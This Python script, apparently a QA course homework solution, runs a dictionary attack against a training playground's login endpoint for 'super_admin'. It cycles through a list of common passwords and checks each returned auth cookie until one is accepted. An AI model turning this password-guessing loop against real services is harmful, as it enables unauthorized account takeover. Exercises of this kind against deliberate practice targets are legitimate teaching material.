import requests

su_passwords = ["123456", "123456789", "qwerty", "password", "1234567", "12345678", "12345", "iloveyou",
                "111111", "123123", "abc123", "qwerty123", "1q2w3e4r", "admin",
                "qwertyuiop", "654321", "555555", "lovely", "7777777", "welcome", "888888",
                "princess", "dragon", "password1", "123qwe", "monkey", "football", "charlie", "donald",
                "freedom", "trustno1", "qazwsx", "!@#$%^&*", "flower", "ashley", "sunshine", "master",
                "michael", "ninja", "mustang", "aa123456", "login", "letmein", "baseball", "solo",
                "passw0rd", "hottie", "starwars", "bailey", "shadow", "superman", "Football", "jesus",
                "000000", "azerty", "photoshop", "1234567890", "1234", "1qaz2wsx", "batman", "696969",
                "loveme", "whatever", "666666"]

for i in su_passwords:
    cookies_response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": i})
    cookie_value = cookies_response.cookies.get("auth_cookie")
    auth_response = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={"auth_cookie": cookie_value})
    if auth_response.text == "You are NOT authorized":
        continue
    else:
        print(f"{auth_response.text}, '{i}' is correct password for 'super_admin'")
        break
